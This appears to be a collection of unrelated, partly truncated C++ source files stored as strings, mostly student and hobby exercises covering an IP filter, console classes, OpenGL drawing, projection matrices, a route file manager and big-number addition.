switch(Timers1){\n    case 0: B_1 = 0x8; B_2 = 0x5; C_1 = 0x0; break;\n    case 1: if(Timers_f == 0){\n    B_1 = 0xC; B_2 = 0x5; C_1 = 0x0;}\n  else {\n    B_1 = 0xA; B_2 = 0x5; C_1 = 0x0;}\n  break;\n    case 2: if(Timers_f == 0){\n    B_1 = 0xE; B_2 = 0x5; C_1 = 0x0;}\n  else {\n    B_1 = 0x9; B_2 = 0x5; C_1 = 0x0;}\n  break;\n   case 3: if(Timers_f == 0){\n    B_1 = 0xD; B_2 = 0x5; C_1 = 0x0;}\n  else {\n    B_1 = 0xB; B_2 = 0x5; C_1 = 0x0;}\n  break;\n   case 4: if(Timers_f == 0){\n    B_1 = 0xF; B_2 = 0x5; C_1 = 0x0;}\n  else {\n    B_1 = 0x8; B_2 = 0xD; C_1 = 0x0;}\n  break;\n   case 5: if(Timers_f == 0){\n  ",
    "#include <cassert>\n#include <cstdlib>\n#include <iostream>\n#include <string>\n#include <vector>\n#include <algorithm>\n//#include <arpa/inet.h>\n#include \"ip_filter.h\"\n\n// (\"\",  '.') -> [\"\"]\n// (\"11\", '.') -> [\"11\"]\n// (\"..\", '.') -> [\"\", \"\", \"\"]\n// (\"11.\", '.') -> [\"11\", \"\"]\n// (\".11\", '.') -> [\"\", \"11\"]\n// (\"11.22\", '.') -> [\"11\", \"22\"]\nstd::vector<std::string> split(const std::string &str, char d)\n{\n    std::vector<std::string> r;\n\n    auto start = 0;\n    auto stop = str.find_first_of(d);\n    while(stop != std::string::npos)\n    {\n        r.push_back(str.substr(start, stop - start));\n\n        start = stop + 1;\n        stop = str.find_first_of(d, start);\n    }\n\n    r.push_back(str.substr(start));\n\n    return r;\n}\n\nIpv4Descr::Ipv4Descr(const std::string &s)\n{\n    uint32_t buff = 0;\n    //if(0 >= inet_pton(AF_INET, s.c_str(), &buff))\n    //    addr = 0; // not correct ipv4 \n    //addr = htonl(buff);\n\n    for (auto i : split(s, '.'))\n        buff = std::stoi(i) + buff * 256;\n    \n    addr = buff;\n    strncpy(repr, s.c_str(), sizeof(repr));\n}\n\nint main(int argc, char const *argv[])\n{\n    try\n    {\n        std::vector<Ipv4Descr> ip_pool;\n\n        for(std::string line; std::getline(std::cin, line);)\n        {\n            auto v = split(line, '\\t');\n            ip_pool.push_back(Ipv4Descr(v.at(0)));\n        }\n\n        std::sort(ip_pool.begin(), ip_pool.end(), [](auto a, auto b){ return a.addr > b.addr;});\n\n        // output sorted\n        for(auto ip : ip_pool)\n            std::cout << ip.repr << std::endl;\n\n        // filter by first byte and output\n        for(auto ip : ip_pool)\n            if (ip.isFirstEqual(1))\n                std::cout << ip.repr << std::endl;\n\n        // filter by first and second bytes and output\n        for(auto ip : ip_pool)\n            if (ip.isFirstAndSecondEqual(46, 70))\n                std::cout << ip.repr << std::endl;\n\n        // filter by any byte and output\n        for(auto ip : ip_pool)\n            if (ip.isAnyEqual(46))\n                std::cout << ip.repr << std::endl;\n\n    }\n    catch(const std::exception &e)\n    {\n        std::cerr << e.what() << std::endl;\n    }\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\n#include <windows.h>\nusing namespace std;\n\nclass Pen \n{\npublic:\n\tstring color;\n\tstring material;\n\tdouble size;\n\tbool cap;\t\n\tunsigned int fullness; //0-100\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\t//__________________________________\n\tvoid Pen_color ()\n\t{\n\t\tSetConsoleTextAttribute(h, 6);\n\t\tcout << \"Pen is \" << color <<\"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Pen_material()\n\t{\n\t\tSetConsoleTextAttribute(h, 13);\n\t\tcout << \"Pen is \" << material << \"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Pen_size()\n\t{\n\t\tSetConsoleTextAttribute(h, 12);\n\t\tcout << \"Pen is \" << size << \" mm long\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Is_pen_cap() \n\t{\n\t\tSetConsoleTextAttribute(h, 9);\n\n\t\tif (cap == true)\n\t\t{\n\t\t\tcout << \"Pen has a cap\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"Pen has no cap\\n\";\n\t\t}\n\t\tSetConsoleTextAttribute(h, 15);\n\n\t}\n\n\tvoid Is_pen_full()\n\t{\n\t\tSetConsoleTextAttribute(h, 10);\n\n\t\tif (fullness < 30)\n\t\t{\n\t\t\tcout << \"Pen is gonna be empty, buy new one\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"Pen is full, everything OK\\n\";\n\t\t}\n\t\tSetConsoleTextAttribute(h, 15);\n\n\t}\n};\n\nclass Table\n{\npublic:\n\tstring color;\n\tstring material;\n\tint width;\n\tint height;\n\tbool shelf;\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\t//__________________________________\n\tvoid Table_color()\n\t{\n\t\tSetConsoleTextAttribute(h, 6);\n\t\tcout << \"Table is \" << color << \"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Table_material()\n\t{\n\t\tSetConsoleTextAttribute(h, 13);\n\t\tcout << \"Table is made of\" << material << \"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Table_width()\n\t{\n\t\tSetConsoleTextAttribute(h, 12);\n\t\tcout << \"Table width is \" << width << \" mm long\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Table_height()\n\t{\n\t\tSetConsoleTextAttribute(h, 12);\n\t\tcout << \"Table height is \" << height << \" mm long\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Is_table_shelf()\n\t{\n\t\tSetConsoleTextAttribute(h, 9);\n\n\t\tif (shelf == true)\n\t\t{\n\t\t\tcout << \"Table has a shelf\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"Table has no shelf\\n\";\n\t\t}\n\t\tSetConsoleTextAttribute(h, 15);\n\n\t}\n};\n\nclass Car\n{\npublic:\n\tstring color;\n\tstring brand;\n\tint speed;\n\tbool electric;\n\tint doors;\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\n\t//__________________________________\n\n\tvoid Car_color()\n\t{\n\t\tSetConsoleTextAttribute(h, 2);\n\t\tcout << \"Car color is \" << color << \"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Car_brand()\n\t{\n\t\tSetConsoleTextAttribute(h, 3);\n\t\tcout << \"Car brand is \" << brand << \"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Car_speed()\n\t{\n\t\tSetConsoleTextAttribute(h, 12);\n\t\tcout << \"Car speed is \" << speed << \" km/h\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Is_electric()\n\t{\n\t\tSetConsoleTextAttribute(h, 9);\n\n\t\tif (electric)\n\t\t{\n\t\t\tcout << \"The car is electric\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"The car is not electric\\n\";\n\t\t}\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\tvoid doors_number()\n\t{\n\t\tSetConsoleTextAttribute(h, 12);\n\t\tcout << \"Car has \" << doors << \" doors\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n};\n\nclass Kettle\n{\npublic:\n\tstring color;\n\tstring brand;\n\tint capacity;\n\tint power;\n\tbool automatic;\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\n\t//__________________________________\n\n\tvoid Kettle_color()\n\t{\n\t\tSetConsoleTextAttribute(h, 2);\n\t\tcout << \"Kettle color is \" << color << \"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Kettle_brand()\n\t{\n\t\tSetConsoleTextAttribute(h, 3);\n\t\tcout << \"Kettle brand is \" << brand << \"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Kettle_capacity()\n\t{\n\t\tSetConsoleTextAttribute(h, 12);\n\t\tcout << \"Kettle capacity is \" << capacity << \" liters\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Kettle_power()\n\t{\n\t\tSetConsoleTextAttribute(h, 14);\n\t\tcout << \"Kettle power is \" << power << \" watts\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Is_automatic()\n\t{\n\t\tSetConsoleTextAttribute(h, 9);\n\t\tif (automatic)\n\t\t{\n\t\t\tcout << \"The kettle is automatic off\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"The kettle is not automatic off\\n\";\n\t\t}\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\n};\n\nclass Book\n{\npublic:\n\tstring title;\n\tstring author;\n\tint pages;\n\tbool cover;\n\tfloat price;\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\n\t//__________________________________\n\n\tvoid Book_title()\n\t{\n\t\tSetConsoleTextAttribute(h, 10);\n\t\tcout << \"Book title is \\\"\" << title << \"\\\"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Book_author()\n\t{\n\t\tSetConsoleTextAttribute(h, 3);\n\t\tcout << \"Book author is \" << author << \"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Book_pages()\n\t{\n\t\tSetConsoleTextAttribute(h, 12);\n\t\tcout << \"Book has \" << pages << \" pages\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Book_cover()\n\t{\n\t\tSetConsoleTextAttribute(h, 9);\n\t\tif (cover)\n\t\t{\n\t\t\tcout << \"The book has hard cover\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"The book has no hard cover\\n\";\n\t\t}\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n\n\tvoid Book_price()\n\t{\n\t\tSetConsoleTextAttribute(h, 14);\n\t\tcout << \"Book price is \" << price << \" $\" <<\"\\n\";\n\t\tSetConsoleTextAttribute(h, 15);\n\t}\n};\n\nint main()\n{\n\tcou",
    "// Elo Maluco\n// main.cpp\n// Prof. Giovani Bernardes Vitor\n// ECOI24 - 2024\n\n#include <stdlib.h>\n#include <stdio.h>\n#include \"triangle.hpp\"\n\n\n\n \n\n\n\nTriangle::Triangle()\n{\n\tx = y = 0;\n\ttheta = 0.0f;\n\n\n\tpoints_base[0] = glm::vec3( -15.0f,   0.0f , 1.0f);\n        points_base[1] = glm::vec3( 15.0f,  0.0f , 1.0f);\n        points_base[2] = glm::vec3( 0.0f,  50.0f , 1.0f) ;      \n\n\tpoints[0] = points_base[0];\n\tpoints[1] = points_base[1];\n\tpoints[2] = points_base[2];\n//\tstd::cout << \"inicio: \" << glm::to_string(points[0]);\n\t//points = *point_;\n\n}\n//---------------------------------------------------------------------\nTriangle::~Triangle()\n{\n\n}\n\n//---------------------------------------------------------------------\nvoid Triangle::update(int value)\n{\n\tx += value;\n\ty += value;\n\n\ttransform();\n}\n\n//---------------------------------------------------------------------\nvoid Triangle::colision(int x, int y)\n{\n\n\t\n\n}\n\n//---------------------------------------------------------------------\nvoid Triangle::transform(void)\n{\n\n\t//glm::vec4 Position = glm::vec4(glm::vec3(0.0), 1.0);\n        glm::mat3 Model = glm::mat3(1.0);\n        Model[2] = glm::vec3(x, y, 1.0);\n\t\n\n\t//std::cout << \"tes: \" << glm::to_string(Model[0]) << std::endl;\n\t//std::cout << \"tes: \" << glm::to_string(Model[1])<< std::endl;\n\t//std::cout << \"tes: \" << glm::to_string(Model[2])<< \"\\n\" << std::endl;\n\t\n        //glm::vec4 Transformed = Model * Position;\n\n\n\tfor(int i=0; i < 3; i++)\n\t{\n\t\tpoints[i] = Model * points_base[i];\n\n\t}\n\n}\n\n\n\n//---------------------------------------------------------------------\nvoid Triangle::draw()\n{\n\n\t\n\n\tglLineWidth(3.0f);\n\t//glColor3f(0.5f, 0.6f, 0.4f);\n\n\t//transform();\n\t//std::cout << \"tes: \" << glm::to_string(points[0]);\n        glBegin(GL_TRIANGLES);  \n\t\tglVertex2f(points[0].x,points[0].y);\n\t        glVertex2f(points[1].x,points[1].y);\n\t\tglVertex2f(points[2].x,points[2].y);\n        glEnd();\n\n\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nint main(){\r\n\r\n    cout << \"Nama : Muhammad Zamy Alfiansyah\" << endl;\r\n    cout << \"Kelas : 1B\" << endl;\r\n    cout << endl;\r\n\r\n    int angka[5];\r\n\r\n\r\n    cout << \"Masukkan 5 Nilai\" << endl;\r\n\r\n    for(int i = 1; i < 6; ++i){\r\n\r\n        cout << \"Masukkan nilai ke \" << i << \": \";\r\n        cin >> angka[i];\r\n\r\n    }\r\n\r\n    int terbesar = angka[5];\r\n    for(int i = 1; i < 6; i++){\r\n        if(angka[i] > terbesar){\r\n            terbesar = angka[i];\r\n        }\r\n    }\r\n\r\n    cout << endl;\r\n    cout << \"Nilai Tertinggi Adalah  \" << terbesar << endl;\r\n\r\n    cout << endl;\r\n\r\n    int cari;\r\n    cout << \"Masukkan angka untuk dicari : \";\r\n    cin >> cari;\r\n\r\n    cout << endl;\r\n\r\n    bool found = false;\r\n    for(int i = 1; i < 6; i++){\r\n\r\n        if(angka[i] == cari){\r\n\r\n            cout << \"Nilai \" << cari << \" ditemukan, di urutan ke \" << i << endl;\r\n            found = true;\r\n\r\n            }\r\n        }\r\n\r\n        if(!found){\r\n\r\n            cout << \"Nilai \" << cari << \" tidak ditemukan!\" << endl;\r\n\r\n    }\r\n    return 0;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "#include<iostream>\n#include<fstream>\n#include<string>\n#include<vector>\n#include<algorithm>\n#include<conio.h>\n#include<limits>\n#include<numeric>\nusing namespace std;\ntypedef struct r{\n\tchar origen[20];\n\tchar destino[20];\n\tfloat distancia;\n\tfloat precio;\n}ruta;\nruta crear_ruta(const string& o, string& de, float d, float p){\n\truta r;\n\tstrncpy(r.origen,o.c_str(),sizeof(r.origen));\n\tstrncpy(r.destino,de.c_str(),sizeof(r.destino));\n\tr.distancia=d;\n\tr.precio=p;\n\treturn r;\n}\nvoid escritura(ruta r){\n\tofstream f;\n\tf.open(\"Rutas.txt\",ios::in|ios::out|ios::binary);\n\tif(f){\n\t\tf.seekp(0,ios::end);\n\t\tf.write(reinterpret_cast<char*>(&r),sizeof(ruta));\n\t}\n\tf.close();\n}\nvoid imprimir_ruta(const ruta& r){\n\tcout<<r.origen<<\" -> \"<<r.destino<<\" (\"<<r.distancia<<\" km,  $\"<<r.precio<<\")\"<<endl;\n}\nvoid lectura(){\n\tifstream f;\n\truta r;\n\tf.open(\"Rutas.txt\",ios::in|ios::out|ios::binary);\n\tif(f.good()){\n\t\tf.seekg(0,ios::end);\n\t\tint n=f.tellg()/sizeof(ruta);\n\t\tf.seekg(0);\n\t\tfor(int i=0;i<n;i++){\n\t\t\tf.seekg(sizeof(ruta)*i);\n\t\t\tf.read(reinterpret_cast<char*>(&r),sizeof(ruta));\n\t\t\timprimir_ruta(r);\n\t\t}\n\t}\n\tf.close();\n}\nvoid lectura_datoscsv(string &nombrea){\n\tifstream f;\n\tint sw=0;\n\tfloat di,pr;\n\tstring li,o,de,tilin;\n\tf.open(nombrea,ios::in|ios::out);\n\tif(f){\n\t\twhile(getline(f,li,';')){\n\t\t\tswitch(sw){\n\t\t\t\tcase 1:{\n\t\t\t\t\to=tilin;\n\t\t\t\t\tde=li;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcase 2:{\n\t\t\t\t\tdi=stof(li);\n           \t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcase 3:{\n              \t\tpr = stof(li);\n                \tescritura(crear_ruta(o, de, di, pr));\n                \tsw=0;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tdefault:{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(sw==0){\n\t\t\t\tsize_t inicio=li.find('\\n');\n\t\t\t\tif(inicio!=string::npos){\n\t\t\t\t\ttilin=li.substr(inicio+1);\n\t\t\t\t}else{\n\t\t\t\t\ttilin=li;\n\t\t\t\t}\n\t\t\t}\n\t\t\tsw++;\n\t\t}\n\t\tcout<<\"Archivo leido con exito.\"<<endl;\n\t}else{\n\t\tcout<<\"Error: Archivo no leido, verifique el nombre o el formato.\"<<endl;\n\t}\n\tf.close();\n}\nvoid agregar_ruta(){\n\tint sw, va;\n\tstring o,de;\n\tfloat di,p;\n\tdo{\n\t\tsystem(\"cls\");\n\t\tcout<<\"Ruta solo ida(0) o ida y vuelta(1): \";\n\t\tif(cin>>sw){\n\t\t}else{\n\t\t\tcin.clear();\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\tsw=-1;\n\t\t}\n\t}while(sw!=0 && sw!=1);\n\tcin.ignore();\n\tsystem(\"cls\");\n\tcout<<\"Ruta nueva.\"<<endl<<\"Ingrese origen: \";\n\tgetline(cin,o);\n\tcout<<\"Ingrese destino: \";\n\tgetline(cin,de);\n\tdo{\n\t\tsystem(\"cls\");\n\t\tcout<<\"Ingrese la distancia: \";\n\t\tif(cin>>di){\n\t\t\tva=0;\n\t\t}else{\n\t\t\tcin.clear();\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\tva=1;\n\t\t}\n\t}while(va==1);\n\tdo{\n\t\tsystem(\"cls\");\n\t\tcout<<\"Ingrese el precio: \";\n\t\tif(cin>>p){\n\t\t\tva=0;\n\t\t}else{\n\t\t\tcin.clear();\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\tva=1;\n\t\t}\n\t}while(va==1);\n\tescritura(crear_ruta(o,de,di,p));\n\tif(sw==1){\n\t\tescritura(crear_ruta(de,o,di,p));\n\t}\n}\nvector<int> busqueda_recursiva(const string& o, const string& de, int inicio, int &fin, int &sw, const int &tr){\n\truta r;\n\tvector<int> posiciones;\n\tifstream f(\"Rutas.txt\",ios::in|ios::binary);\n\tif(f.is_open()){\t\n\t\tif(inicio<fin){\n\t\t\tf.seekg(tr*inicio);\n\t\t\tf.read(reinterpret_cast<char*>(&r),tr);\n\t\t\tif((sw==0&&strcmp(r.origen,o.c_str())==0)||(sw==1&&strcmp(r.destino,de.c_str())==0)||(sw==2&&strcmp(r.origen,o.c_str())==0&&strcmp(r.destino,de.c_str())==0)){\n        \t\tposiciones.push_back(inicio);\n       \t\t}\t\n\t\t\tvector<int> posiciones2=busqueda_recursiva(o,de,inicio+1,fin,sw,tr);\t\t\n\t\t\tposiciones.insert(posiciones.end(),posiciones2.begin(),posiciones2.end());\n\t\t}\n\t}\n\tf.close();\n\treturn posiciones;\n}\nvoid llamar_busqueda(){\n\truta r;\n\tstring o,de=\"Hola\";\n\tint sw, n=3;\n\tconst int tr=sizeof(ruta);\n\tdo{\n\t\tsystem(\"cls\");\n\t\tcout<<\"Busqueda por origen(0) o por destino(1) o ambos(2): \";\n\t\tif(cin>>sw){\n\t\t}else{\n\t\t\tcin.clear();\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\tsw=-1;\n\t\t}\n\t}while(sw!=0 && sw!=1 && sw!=2);\n\tcin.ignore();\n\tif(sw==0 || sw==2){\n\t\tcout<<\"Ingresa el origen: \";\n\t\tgetline(cin,o);\n\t}\n\tif(sw==1 || sw==2){\n\t\tcout<<\"Ingresa el destino: \";\n\t\tgetline(cin,de);\n\t}\n\tifstream f(\"Rutas.txt\",ios::in|ios::binary);\n\tif(f.is_open()){\n\t\tf.seekg(0,ios::end);\n\t\tn=f.tellg()/tr;\n\t\tf.seekg(0,ios::beg);\n\t\tvector<int>posiciones=busqueda_recursiva(o,de,0,n,sw,tr);\n\t\twhile(!posiciones.empty()){\n\t\t\tn=posiciones.back();\n\t\t\tposiciones.pop_back();\n\t\t\tf.seekg(tr*n);\n\t\t\tf.read(reinterpret_cast<char*>(&r),sizeof(ruta));\n\t\t\tcout<<r.origen<<\" \"<<r.destino<<\" \"<<r.distancia<<\" \"<<r.precio<<\"  Pos:\"<<n<<endl;\n\t\t}\n\t\tf.close();\n\t}\n}\nvoid editar(){\n\tint pos,va;\n\truta r,tilin;\n\tstring o,de;\n\tfloat di,p;\n\tfstream f;\n\tllamar_busqueda();\n\tf.open(\"Rutas.txt\",ios::in|ios::out|ios::binary);\n\tdo{\n\t\tcout<<\"Ingrese la posicion de la ruta a editar: \";\n\t\tif(cin>>pos){\n\t\t\tva=0;\n\t\t}else{\n\t\t\tcin.clear();\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\tva=1;\n\t\t}\n\t\tsystem(\"cls\");\n\t}while(va==1);\n\tcin.ignore();\n\tif(f.is_open()){\n\t\tf.seekp(pos*sizeof(ruta));\n\t\tf.read(reinterpret_cast<char*>(&r),sizeof(ruta));\n\t\timprimir_ruta(r);\n\t\tf.seekg(pos*sizeof(ruta));\n\t\tf.seekp(pos*sizeof(ruta));\n\t\tcout<<\"Origen:\";\n\t\tgetline(cin,o);\n\t\tcout<<\"D",
    "#include <assert.h>\n\n#include \"ndc.h\" /* reversed_y, reversed_z, z_zero_one */\n\n#include \"frustum.h\"\n#include \"mat4.h\"\n\nMat4 projection_matrix(const CameraFrustum& frustum)\n{\n\tif (!frustum.is_ortho)\n\t{\n\t\treturn perspective_matrix(\n\t\t\t\tfrustum.aspect_x, frustum.aspect_y,\n\t\t\t\tfrustum.shift_x, frustum.shift_y,\n\t\t\t\tfrustum.near, frustum.far);\n\t}\n\telse \n\t{\n\t\treturn orthographic_matrix(\n\t\t\t\tfrustum.aspect_x, frustum.aspect_y,\n\t\t\t\tfrustum.shift_x, frustum.shift_y,\n\t\t\t\tfrustum.near, frustum.far);\n\t}\n}\n\nMat4 projection_matrix_inv(const CameraFrustum& frustum)\n{\n\tif (!frustum.is_ortho)\n\t{\n\t\treturn perspective_matrix_inv(\n\t\t\t\tfrustum.aspect_x, frustum.aspect_y,\n\t\t\t\tfrustum.shift_x, frustum.shift_y,\n\t\t\t\tfrustum.near, frustum.far);\n\t}\n\telse \n\t{\n\t\treturn orthographic_matrix_inv(\n\t\t\t\tfrustum.aspect_x, frustum.aspect_y,\n\t\t\t\tfrustum.shift_x, frustum.shift_y,\n\t\t\t\tfrustum.near, frustum.far);\n\t}\n}\n\nMat4 perspective_matrix(float ax, float ay, float sx, float sy, float n, float f)\n{\n\tassert(n != f);\n\t\n\tMat4 M;\n\n\t/* col 0 */\n\tM(0,0) = ax;\n\tM(1,0) = 0.f;\n\tM(2,0) = 0.f;\n\tM(3,0) = 0.f;\n\n\t/* col 1 */\n\tM(0,1) = 0.f;\n\tif constexpr( reversed_y) M(1,1) = -ay;\n\tif constexpr(!reversed_y) M(1,1) = +ay;\n\tM(2,1) = 0.f;\n\tM(3,1) = 0.f;\n\n\t/* col 2*/\n\tM(0,2) = sx;\n\tif constexpr( reversed_y) M(1,2) = -sy;\n\tif constexpr(!reversed_y) M(1,2) = +sy;\n\tif constexpr( z_zero_one &&  reversed_z) \n\t\tM(2,2) = n / (f - n); \n\tif constexpr( z_zero_one && !reversed_z) \n\t\tM(2,2) = -1.f / (1.f - n / f);\n\tif constexpr(!z_zero_one &&  reversed_z) \n\t\tM(2,2) = + (1.f + n / f) / (1.f - n / f);\n\tif constexpr(!z_zero_one && !reversed_z) \n\t\tM(2,2) = - (1.f + n / f) / (1.f - n / f);\n\tM(3,2) = -1.f;\n\n\t/* col 3 */\n\tM(0,3) = 0.f;\n\tM(1,3) = 0.f;\n\tif constexpr( z_zero_one &&  reversed_z) \n\t\tM(2,3) = n / (1.f - n / f);\n\tif constexpr( z_zero_one && !reversed_z) \n\t\tM(2,3) = -n / (1.f - n / f);\n\tif constexpr(!z_zero_one &&  reversed_z) \n\t\tM(2,3) = 2.f * n / (1.f - n / f);\n\tif constexpr(!z_zero_one && !reversed_z) \n\t\tM(2,3) = -2.f * n / (1.f - n / f);\n\tM(3,3) = 0.f;\n\n\treturn (M);\n}\n\nMat4 perspective_matrix_inv(float ax, float ay, float sx, float sy, float n, float f)\n{\n\t\n\tassert(n != 0 && f != 0);\n\n\tconst float inv_ax = 1.f / ax;\n\tconst float inv_ay = 1.f / ay;\n\tconst float inv_n = 1.f / n;\n\tconst float inv_f = 1.f / f;\n\n\tMat4 M;\n\n\t/* col 0 */\n\tM(0,0) = inv_ax;\n\tM(1,0) = 0.f;\n\tM(2,0) = 0.f;\n\tM(3,0) = 0.f;\n\n\t/* col 1 */\n\tM(0,1) = 0.f;\n\tif constexpr( reversed_y) M(1,1) = -inv_ay;\n\tif constexpr(!reversed_y) M(1,1) = inv_ay;\n\tM(2,1) = 0.f;\n\tM(3,1) = 0.f;\n\n\t/* col 2*/\n\tM(0,2) = 0.f;\n\tM(1,2) = 0.f;\n\tM(2,2) = 0.f;\n\tif constexpr( z_zero_one &&  reversed_z) \n\t\tM(3,2) = inv_n - inv_f;\n\tif constexpr( z_zero_one && !reversed_z) \n\t\tM(3,2) = inv_f - inv_n;\n\tif constexpr(!z_zero_one &&  reversed_z) \n\t\tM(3,2) = 0.5f * (inv_n - inv_f);\n\tif constexpr(!z_zero_one && !reversed_z) \n\t\tM(3,2) = 0.5f * (inv_f - inv_n);\n\n\t/* col 3 */\n\tM(0,3) = sx * inv_ax;\n\tif constexpr( reversed_y) M(1,3) = -sy * inv_ay;\n\tif constexpr(!reversed_y) M(1,3) = +sy * inv_ay;\n\tM(2,3) = -1.f;\n\tif constexpr( z_zero_one &&  reversed_z) \n\t\tM(3,3) = inv_f;\n\tif constexpr( z_zero_one && !reversed_z) \n\t\tM(3,3) = inv_n;\n\tif constexpr(!z_zero_one &&  reversed_z) \n\t\tM(3,3) = 0.5 * (inv_n + inv_f);\n\tif constexpr(!z_zero_one && !reversed_z) \n\t\tM(3,3) = 0.5 * (inv_n + inv_f);\n\n\treturn (M);\n}\n\nMat4 orthographic_matrix(float ax, float ay, float sx, float sy, float n, float f)\n{\n\tassert(n != f);\n\n\tMat4 M;\n\n\t/* col 0 */\n\tM(0,0) = ax;\n\tM(1,0) = 0.f;\n\tM(2,0) = 0.f;\n\tM(3,0) = 0.f;\n\n\t/* col 1 */\n\tM(0,1) = 0.f;\n\tif constexpr( reversed_y) M(1,1) = -ay;\n\tif constexpr(!reversed_y) M(1,1) = +ay;\n\tM(2,1) = 0.f;\n\tM(3,1) = 0.f;\n\n\t/* col 2*/\n\tM(0,2) = 0.f;\n\tM(1,2) = 0.f;\n\tif constexpr( z_zero_one &&  reversed_z) \n\t\tM(2,2) = 1.0f / (f - n);\n\tif constexpr( z_zero_one && !reversed_z) \n\t\tM(2,2) = -1.0f / (f - n);\n\tif constexpr(!z_zero_one &&  reversed_z) \n\t\tM(2,2) = 2.0f / (f - n);\n\tif constexpr(!z_zero_one && !reversed_z) \n\t\tM(2,2) = -2.0f / (f - n);\n\tM(3,2) = 0.f;\n\n\t/* col 3 */\n\tM(0,3) = -sx;\n\tif constexpr( reversed_y) M(1,3) = +sy;\n\tif constexpr(!reversed_y) M(1,3) = -sy;\n\tif constexpr( z_zero_one &&  reversed_z) \n\t\tM(2,3) = 1.0f / (1.0f - n / f);\n\tif constexpr( z_zero_one && !reversed_z) \n\t\tM(2,3) = -n / (f - n);\n\tif constexpr(!z_zero_one &&  reversed_z) \n\t\tM(2,3) = (1.0f + n / f) / (1.0f - n / f);\n\tif constexpr(!z_zero_one && !reversed_z) \n\t\tM(2,3) = -(1.0f + n / f) / (1.0f - n / f);\n\tM(3,3) = 1.f;\n\t\n\treturn (M);\n}\n\nMat4 orthographic_matrix_inv(float ax, float ay, float sx, float sy, float n, float f)\n{\n\tassert(n != f);\n\n\tconst float inv_ax = 1.f / ax;\n\tconst float inv_ay = 1.f / ay;\n\n\tMat4 M;\n\n\t/* col 0 */\n\tM(0,0) = inv_ax;\n\tM(1,0) = 0.f;\n\tM(2,0) = 0.f;\n\tM(3,0) = 0.f;\n\n\t/* col 1 */\n\tM(0,1) = 0.f;\n\tif constexpr( reversed_y) M(1,1) = -inv_ay;\n\tif constexpr(!reversed_y) M(1,1) = +inv_ay;\n\tM(2,1) = 0.f;\n\tM(3,1) = 0.f;\n\n\t/* col 2*/\n\tM(0,2) = 0.f;\n\tM(1,2) = 0.f;\n\tif constexpr( z_zero_one &&  reversed_z) \n\t\tM(2,2) = f - n;\n\tif constexpr( z_zero_one && !reversed_z)",
    "#include<iostream>\r\n#include<algorithm>\r\n#include<string>\r\nusing namespace std;\r\n\r\nvoid calculateBig();\r\n\r\nint main()\r\n{\r\n\tcalculateBig();\r\n\r\n\r\n\treturn 0;\r\n}\r\n\r\nvoid calculateBig()\r\n{\r\n\tstring a;\r\n\tstring b;\r\n\r\n\tcin >> a;\r\n\tcin >> b;\r\n\r\n\tstring big;\r\n\tstring small;\r\n\r\n\tif (a.size() > b.size())\r\n\t{\r\n\t\tbig = '0' + a; small = b;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tbig = '0' + b; small = a;\r\n\t}\r\n\r\n\treverse(big.begin(), big.end());\r\n\treverse(small.begin(), small.end());\r\n\r\n\r\n\tint i = 0;\r\n\r\n\r\n\tfor (i = 0; i < small.length(); i++)\r\n\t\tsmall[i] -= '0';\r\n\r\n\tfor (i = 0; i < big.length(); i++)\r\n\t\tbig[i] -= '0';\r\n\r\n\r\n\tfor (i = 0; i < small.length(); i++)\r\n\t\tbig[i] = (big[i] + 